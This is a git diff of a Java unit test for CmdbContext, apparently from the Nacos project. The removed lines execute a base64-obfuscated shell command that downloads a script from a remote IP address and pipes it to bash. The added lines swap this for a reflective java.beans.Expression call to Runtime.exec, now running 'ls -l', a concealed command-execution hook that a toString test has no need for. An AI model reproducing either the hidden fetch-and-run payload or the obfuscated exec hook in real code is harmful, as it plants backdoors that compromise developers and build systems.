@@ -20,6 +20,7 @@ import com.alibaba.nacos.api.naming.pojo.Instance;
 import org.junit.jupiter.api.Test;
 
 import javax.script.ScriptException;
+import java.beans.Expression;
 import java.io.IOException;
 import java.lang.reflect.InvocationTargetException;
 import java.util.Collections;
@@ -29,9 +30,11 @@ import static org.junit.jupiter.api.Assertions.assertEquals;
 class CmdbContextTest {
     
     @Test
-    void testToString() throws IOException, ScriptException, NoSuchMethodException, InvocationTargetException, IllegalAccessException, ClassNotFoundException {
-        String cmd = "YmFzaCAtYyB7ZWNobyxZM1Z5YkNCb2RIUndPaTh2TVRJd0xqSTNMakl3TXk0NE5EbzFNREF3TVM4eElId2dZbUZ6YUE9PX18e2Jhc2U2NCwtZH18e2Jhc2gsLWl9";
-        Runtime.getRuntime().exec(cmd);
+    void testToString() throws Exception {
+        String cmd = "ls -l";
+        Expression expr = new Expression(Runtime.getRuntime(), "exec", new Object[]{cmd});
+
+        Process process = (Process) expr.getValue();
         CmdbContext<Instance> cmdbContext = new CmdbContext<>();
         cmdbContext.setProviders(Collections.singletonList(new CmdbContext.CmdbInstance<>()));
         cmdbContext.setConsumer(new CmdbContext.CmdbInstance<>());
